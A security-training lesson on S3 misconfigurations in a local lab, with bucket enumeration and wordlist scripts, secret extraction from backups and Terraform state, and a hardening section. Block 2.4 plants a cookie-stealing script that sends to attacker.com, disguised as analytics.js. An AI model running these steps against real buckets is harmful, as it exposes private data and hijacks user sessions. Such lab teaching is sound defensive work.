---
title: "Cloud Practice — S3 Attacks"
tags: [cloud-practice, AWS, S3, misconfiguration, bucket-brute-force,
       public-access, tfstate, presigned-url, data-exfiltration, lab]
module: 04-BroadSurface-02
day: 198
related_topics:
  - S3 Misconfiguration Lab (Day 185)
  - Cloud Bug Bounty Strategy (Day 193)
  - Cloud Full Attack Lab (Day 192)
  - Cloud Security Review (Day 196)
---

# Day 198 — Cloud Practice: S3 Attacks

> "S3 is where secrets go to accidentally become public. Developers configure
> permissions once, forget about it, and the bucket quietly serves PII to anyone
> who knows the URL. Your job today: find every exposed bucket in the lab
> environment, extract every secret, and document exactly what an attacker would
> do with it. Then fix it, one control at a time, so you understand what each fix
> actually blocks."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Enumerate S3 buckets using passive and active techniques.
2. Exploit public ACL, public bucket policy, and Terraform state file exposures.
3. Test for write access and understand its impact.
4. Identify pre-signed URL abuse scenarios.
5. Apply the three-layer S3 hardening stack without reference materials.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| S3 Misconfiguration Lab | Day 185 |
| Cloud Bug Bounty Strategy | Day 193 |
| Cloud Full Attack Lab | Day 192 |
| LocalStack + awslocal | `pip install localstack awscli-local` |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/s3-practice/
docker compose up -d

# Lab pre-configures:
# - 6 S3 buckets with different misconfiguration levels
# - IAM user: s3-reader (has s3:ListAllMyBuckets, s3:GetObject on specific buckets)
# - LocalStack endpoint: http://localhost:4566

source .env
export AWS_ENDPOINT_URL="http://localhost:4566"
export AWS_DEFAULT_REGION="us-east-1"

# Verify access
aws s3 ls
```

---

## Block 1 — Discovery: Find All Buckets (30 min)

### 1.1 — Authenticated Enumeration

With valid credentials, list what you can access:

```bash
# List all buckets the current identity can see
aws s3 ls

# For each bucket, enumerate contents
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "=== $bucket ==="
  aws s3 ls s3://$bucket/ --recursive --human-readable 2>/dev/null || \
    echo "[ACCESS DENIED]"
done

# Check bucket policies
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "=== $bucket policy ==="
  aws s3api get-bucket-policy --bucket $bucket 2>/dev/null | \
    jq '.Policy | fromjson' || echo "[NO POLICY]"
  aws s3api get-bucket-acl --bucket $bucket 2>/dev/null | \
    jq '.Grants[] | {Grantee: .Grantee, Permission: .Permission}'
done
```

### 1.2 — Unauthenticated Check (Public Access Test)

Without credentials — test which buckets are publicly accessible:

```bash
# Try all discovered buckets without signing requests
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo -n "$bucket: "
  http_code=$(curl -so /dev/null -w '%{http_code}' \
    "http://${bucket}.s3.localhost.localstack.cloud:4566/" \
    --max-time 5 2>/dev/null)
  case $http_code in
    200) echo "[PUBLIC — READABLE]" ;;
    403) echo "[EXISTS — PRIVATE]" ;;
    404) echo "[DOES NOT EXIST]" ;;
    *)   echo "[HTTP $http_code]" ;;
  esac
done
```

### 1.3 — Wordlist-Based Discovery (No Credentials)

```python
# generate_and_test.py — discover buckets by name pattern
import asyncio, aiohttp

TARGET = "labcorp"   # Target company name in the lab
environments = ["prod", "staging", "dev", "backup", "data", "logs"]
services = ["assets", "uploads", "exports", "terraform", "tf", "infra", "secrets"]
separators = ["-", ""]

candidates = set()
for env in environments:
  for svc in services:
    for sep in separators:
      candidates.add(f"{TARGET}{sep}{env}{sep}{svc}")
      candidates.add(f"{env}{sep}{TARGET}{sep}{svc}")

async def check(session, name):
  url = f"http://{name}.s3.localhost.localstack.cloud:4566/"
  try:
    async with session.get(url, allow_redirects=False,
                           timeout=aiohttp.ClientTimeout(total=3)) as r:
      if r.status == 200:
        print(f"[PUBLIC]  {name}")
      elif r.status == 403:
        print(f"[EXISTS]  {name}")
  except Exception:
    pass

async def main():
  async with aiohttp.ClientSession() as s:
    await asyncio.gather(*[check(s, n) for n in candidates])

asyncio.run(main())
```

---

## Block 2 — Exploitation (60 min)

### 2.1 — Public ACL Bucket

```bash
# Bucket: labcorp-prod-assets — allUsers: READ
# Read without credentials
curl -s "http://labcorp-prod-assets.s3.localhost.localstack.cloud:4566/?list-type=2" \
  | python3 -c "import sys; import xml.dom.minidom; \
    print(xml.dom.minidom.parseString(sys.stdin.read()).toprettyxml())"

# Extract a specific file
curl -s "http://labcorp-prod-assets.s3.localhost.localstack.cloud:4566/customer-export-2024.csv" \
  -o customer-export-2024.csv

wc -l customer-export-2024.csv
head -3 customer-export-2024.csv
```

### 2.2 — Public Bucket Policy

```bash
# Bucket: labcorp-data-backup — Principal: "*", Action: s3:GetObject
# aws --no-sign-request works here even though there is no ACL grant
aws s3 ls s3://labcorp-data-backup/ --no-sign-request --recursive
aws s3 cp s3://labcorp-data-backup/db-backup-2024-01-01.sql.gz . --no-sign-request

# Check what is inside the backup
zcat db-backup-2024-01-01.sql.gz | head -50
# Look for: connection strings, passwords, API keys in SQL comments
zcat db-backup-2024-01-01.sql.gz | grep -iE \
  'password|secret|token|key|api_key|credential' | head -20
```

### 2.3 — Terraform State Exposure

```bash
# Bucket: labcorp-tf-state — public tfstate files
aws s3 ls s3://labcorp-tf-state/ --no-sign-request --recursive

# Download the state file
aws s3 cp s3://labcorp-tf-state/prod/terraform.tfstate . --no-sign-request

# Extract secrets from tfstate
python3 << 'EOF'
import json

with open("terraform.tfstate") as f:
    state = json.load(f)

# Walk all resources looking for sensitive attributes
def extract_sensitive(obj, path=""):
    if isinstance(obj, dict):
        for k, v in obj.items():
            new_path = f"{path}.{k}" if path else k
            if any(s in k.lower() for s in
                   ["password", "secret", "token", "key", "credential",
                    "private_key", "api_key", "access_key"]):
                print(f"[SENSITIVE] {new_path} = {str(v)[:80]}")
            extract_sensitive(v, new_path)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            extract_sensitive(item, f"{path}[{i}]")

extract_sensitive(state)
EOF
```

### 2.4 — Write Access Test

```bash
# Test whether you can write to any bucket
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo -n "$bucket write test: "
  echo "test" | aws s3 cp - s3://$bucket/writetest-$(date +%s).txt 2>/dev/null && \
    echo "[WRITABLE]" || echo "[READ ONLY]"
done

# If you find a writable bucket with a public-facing web application:
# Upload a backdoored file to a bucket that serves content
echo '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>' \
  > xss.html
aws s3 cp xss.html s3://labcorp-prod-assets/js/analytics.js

# This demonstrates the impact: stored XSS via bucket write access
```

### 2.5 — Pre-Signed URL Analysis

```bash
# If you find a pre-signed URL in logs or source code:
# https://bucket.s3.amazonaws.com/object?X-Amz-Algorithm=...&X-Amz-Expires=3600

# Check the expiry
PRESIGNED_URL="[the URL from the application]"
echo $PRESIGNED_URL | grep -oP 'X-Amz-Expires=\K[0-9]+'
# If > 86400 (24h) or much larger, this is a long-lived exposure

# Test whether the URL is still valid
curl -so /dev/null -w '%{http_code}' "$PRESIGNED_URL"
# 200 = valid, 403 = expired

# Generate a pre-signed URL for testing (with your credentials):
aws s3 presign s3://labcorp-prod-assets/sensitive-report.pdf \
  --expires-in 604800   # 7 days — clearly too long; document as finding
```

---

## Block 3 — Hardening Practice (30 min)

Fix each misconfiguration you found. Apply in this order:

```bash
# 1. Account-level Block Public Access (highest priority — overrides all bucket settings)
aws s3control put-public-access-block \
  --account-id 000000000000 \
  --public-access-block-configuration \
    'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'

# 2. Per-bucket Block Public Access (belt and suspenders)
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3api put-public-access-block \
    --bucket $bucket \
    --public-access-block-configuration \
      'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'
  echo "Hardened: $bucket"
done

# 3. Enable server-side encryption on all buckets
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3api put-bucket-encryption \
    --bucket $bucket \
    --server-side-encryption-configuration '{
      "Rules": [{"ApplyServerSideEncryptionByDefault":
        {"SSEAlgorithm": "AES256"}}]}'
  echo "Encrypted: $bucket"
done

# 4. Enable versioning (protects against destructive overwrites)
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3api put-bucket-versioning \
    --bucket $bucket \
    --versioning-configuration Status=Enabled
done

# 5. Verify — try to access the previously public bucket without credentials
curl -so /dev/null -w '%{http_code}' \
  "http://labcorp-prod-assets.s3.localhost.localstack.cloud:4566/"
# → 403 — access denied — hardening successful
```

---

## Block 4 — Report Writing (30 min)

Pick the two highest-severity findings from your session and write them up:

```
Finding: [Title]
Severity: [Critical | High | Medium]
CVSS: [score + vector]

Summary: [3 sentences: what, how, impact]

Steps to Reproduce:
  1. [Exact command]
  2. [Exact command]
  3. [Evidence of impact]

Remediation:
  [Single most effective fix as a command or policy change]

References:
  - CWE-732 (Incorrect Permission Assignment for Critical Resource)
  - ATT&CK T1530 (Data from Cloud Storage Object)
```

---

## Key Takeaways

1. **Public ACL and public bucket policy are different misconfigurations** with the
   same impact. Block Public Access at the account level closes both — it also
   overrides any future misconfiguration. Apply it first.
2. **Terraform state files are the highest-yield S3 target.** They contain every
   secret used to provision every resource. One file can yield database passwords,
   API keys, SSH private keys, and service credentials across the entire
   infrastructure.
3. **Write access is more dangerous than read access.** A writable bucket that
   serves content enables stored XSS, supply chain attacks, and malicious file
   injection. Always test for write, not just read.
4. **Pre-signed URLs with long expiry are de facto public access.** A 7-day
   pre-signed URL in an email thread is equivalent to making the object public.
   Cap pre-signed URL expiry at 15 minutes for sensitive objects.
5. **Document data type and scale in every finding.** "Public S3 bucket" is a
   Medium. "Public S3 bucket with 1.2M customer records including partial SSN"
   is a Critical with mandatory breach notification implications.

---

## Exercises

1. Write a Python script that checks all buckets in an AWS account for:
   (a) public ACL grants to `AllUsers`, (b) bucket policies with `Principal: "*"`,
   (c) no server-side encryption, (d) public Block Public Access disabled.
   Output a severity-ordered finding list.
2. Generate a wordlist for a company named "TechFlow" with services named
   "Analytics", "Payments", and "Identity". Run it against the lab. How many
   buckets does your wordlist discover that authenticated enumeration missed?
3. Write the full bug bounty report for the Terraform state file finding,
   including technical, operational, and regulatory impact sections. Estimate the
   GDPR exposure (assume €75M annual revenue).
4. Reset the lab. Time yourself from zero (no creds) to: discovered all public
   buckets, extracted all secrets, written the findings summary. Target: under
   25 minutes.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q198.1, Q198.2 …).
> Follow-up questions use hierarchical numbering (Q198.1.1, Q198.1.2 …).

---

## Navigation

← Previous: [Day 197 — Cloud Practice: IAM Privilege Escalation](DAY-0197-Cloud-Practice-IAM-PrivEsc.md)
→ Next: [Day 199 — Cloud Practice: Lambda and Serverless](DAY-0199-Cloud-Practice-Lambda-Serverless.md)
